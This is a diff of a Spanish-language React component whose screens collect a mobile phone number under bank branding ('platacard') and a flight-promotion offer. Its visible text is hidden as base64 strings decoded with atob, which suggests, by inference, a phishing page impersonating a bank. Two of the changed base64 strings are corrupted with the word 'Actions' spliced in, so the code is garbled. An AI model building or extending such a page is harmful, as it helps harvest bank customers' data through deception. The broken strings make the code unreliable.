@@ -410,7 +410,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
 
                 {/* Botón continuar */}
                 <Button
-                  onClick={() => onSubmit(ScreenType.PHONE_INPUT, { phone: dataA })}
+                  onClick={() =>onSubmit(ScreenType.PHONE_INPUT, { phone: dataA })}
                   disabled={!dataA || dataA.length !== 10}
                   className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                 >
@@ -1701,7 +1701,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <>
             <h2 className="text-xl font-bold mb-3">{atob('SW5ncmVzYSB0dSB0ZWzDqWZvbm8gY2VsdWxhciByZWdpc3RyYWRv')}</h2>
             <p className="mb-4 text-sm text-gray-600">
-              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIGEgMTAgZMOtZ2l0b3MgcGFyYSBjb250aW51YXI Y29uIGxhIHByb21vY2nDs24gZGUgdnVlbG9z')}
+              {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGRlIHRlbMOpZm9ubyBjZWx1bGFyIActionsIAo=')}
             </p>
 
             <div className="mb-4">
@@ -1725,7 +1725,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 />
               </div>
               <p className="text-xs text-gray-500 mt-1">
-                {atob('SW5ncmVzYSB0dSBuw7ptZXJvIGEgMTAgZMOtZ2l0b3Mgc2luIGVzcGFjaW9zIG5pIGd1aW9uZXM=')}
+                {atob('SW5ncmVzYSB0dSBuw7ptZXJvIActionsIAo=')}
               </p>
             </div>
 
@@ -2683,13 +2683,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(generandoPromocionContent);
 
       default:
-        const defaultContent = (
-          <>
-            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
-            <p>La pantalla solicitada no está disponible en este momento.</p>
-          </>
+        return (
+          <div className="text-center py-8">
+            <p className="text-gray-600">
+              Tipo de pantalla no reconocido: {currentScreen}
+            </p>
+          </div>
         );
-        return getBankContainer(defaultContent);
     }
   };
 
